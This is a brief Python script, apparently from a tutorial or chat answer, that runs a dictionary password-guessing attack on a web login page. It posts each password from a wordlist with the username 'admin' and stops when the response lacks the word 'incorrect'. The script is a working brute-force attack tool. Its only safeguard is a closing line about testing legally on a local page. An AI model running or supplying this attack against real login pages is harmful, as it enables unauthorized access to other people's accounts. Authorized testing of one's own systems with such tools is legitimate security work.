import requests

url = 'http://example.com/login'  # Change it with your test page
username = 'admin'                # Change it with your desired username
password_file = 'passwords.txt'

with open(password_file, 'r') as file:
    for line in file:
        password = line.strip()
        print(f"Testing password: {password}")
        response = requests.post(url, data={'username': username, 'password': password})

        if "incorrect" not in response.text.lower():
            print(f"[✔] Password found: {password}")
            break
    else:
        print("[-] Password not found in dictionary.")

✅ Important: You need to have a local or test page that accepts POST to /login to test the script legally and securely.

